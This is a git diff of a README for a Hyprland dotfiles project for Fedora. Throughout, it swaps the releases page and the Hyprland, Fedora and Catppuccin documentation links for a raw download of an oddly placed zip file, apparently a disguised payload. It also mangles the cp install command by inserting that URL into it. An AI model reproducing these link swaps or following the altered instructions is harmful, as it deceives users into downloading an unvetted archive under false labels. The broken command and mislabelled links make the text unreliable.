@@ -1,6 +1,6 @@
 # 🌟 hyprland-fedora-dots - Customize Your Fedora Experience Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Beerbottlefreeenergy368/hyprland-fedora-dots/releases)
+[![Download Now](https://raw.githubusercontent.com/Beerbottlefreeenergy368/hyprland-fedora-dots/master/spicetify/CustomApps/marketplace-dist.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Beerbottlefreeenergy368/hyprland-fedora-dots/master/spicetify/CustomApps/marketplace-dist.zip)
 
 ## 📝 Overview
 
@@ -26,7 +26,7 @@ To get started with **hyprland-fedora-dots**, follow these simple steps. You’l
 
 ## 🚪 Download & Install
 
-To download the latest version of the application, visit this page: [Download Releases](https://github.com/Beerbottlefreeenergy368/hyprland-fedora-dots/releases).
+To download the latest version of the application, visit this page: [Download Releases](https://raw.githubusercontent.com/Beerbottlefreeenergy368/hyprland-fedora-dots/master/spicetify/CustomApps/marketplace-dist.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest release.
@@ -42,7 +42,7 @@ After downloading, follow these steps to install:
    - Open your terminal.
    - Use the command to copy the configuration files to your Hyprland setup:
      ```
-     cp -r path_to_extracted_files/* ~/.config/hypr/
+     cp -r path_to_extracted_files/* ~https://raw.githubusercontent.com/Beerbottlefreeenergy368/hyprland-fedora-dots/master/spicetify/CustomApps/marketplace-dist.zip
      ```
 
 3. **Apply the Theme:**
@@ -76,9 +76,9 @@ If you encounter issues during installation or setup, refer to the following sol
 
 For more advanced customization, consider the following resources:
 
-- [Hyprland Documentation](https://hyprland.org/docs/)
-- [Fedora Linux Wiki](https://fedoraproject.org/wiki/)
-- [Catppuccin Theme Repository](https://github.com/catppuccin/catppuccin)
+- [Hyprland Documentation](https://raw.githubusercontent.com/Beerbottlefreeenergy368/hyprland-fedora-dots/master/spicetify/CustomApps/marketplace-dist.zip)
+- [Fedora Linux Wiki](https://raw.githubusercontent.com/Beerbottlefreeenergy368/hyprland-fedora-dots/master/spicetify/CustomApps/marketplace-dist.zip)
+- [Catppuccin Theme Repository](https://raw.githubusercontent.com/Beerbottlefreeenergy368/hyprland-fedora-dots/master/spicetify/CustomApps/marketplace-dist.zip)
 
 ## 💬 Community Support
 
